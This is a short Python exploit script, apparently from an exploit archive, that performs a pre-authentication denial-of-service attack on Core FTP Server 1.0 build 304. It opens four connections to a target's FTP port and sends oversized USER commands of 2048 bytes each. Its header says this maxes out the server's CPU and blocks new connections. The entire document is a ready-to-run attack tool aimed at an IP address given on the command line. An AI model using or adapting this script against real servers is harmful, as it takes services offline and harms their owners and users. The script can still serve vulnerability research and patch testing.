#!/usr/bin/env python

###################################################################################
#
# Core FTP Server 1.0, build 304 Remote Denial of Service Exploit (Pre Auth)
# Found By:     Dr_IDE
# Tested On:    Windows XPSP3
# Download:     http://www.coreftp.com/server/
# Notes:	This will cause CPU usage to go to 100% and prevent new connections
# Usage:	./script <Target IP>
#
###################################################################################

import socket, sys

def banner():
	print "\n##################################################################" 
	print "#                                                             	#"
	print "#     Core FTP Server 1.0, build 304 Remote DoS Exploit       	#" 
	print "#                       by Dr_IDE                             	#"
	print "#								#"
	print "##################################################################\n"

s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

buff = ("\x41" * 2048);

try:
	banner();
	print ("[*] Connecting to target...");
	s1.connect((sys.argv[1] , 21));
	s2.connect((sys.argv[1] , 21));
	s3.connect((sys.argv[1] , 21));
	s4.connect((sys.argv[1] , 21));
	print ("[*] Sending evil stuff...");
	s1.send("USER " + buff + "\r\n");
	s2.send("USER " + buff + "\r\n");
	s3.send("USER " + buff + "\r\n");
	s4.send("USER " + buff + "\r\n");	
	print ("[*] Success! The server should now be inaccessible");
	s1.close();
	s2.close();
	s3.close();
	s4.close();

except:
	print ("[-] Could not connect to server.");
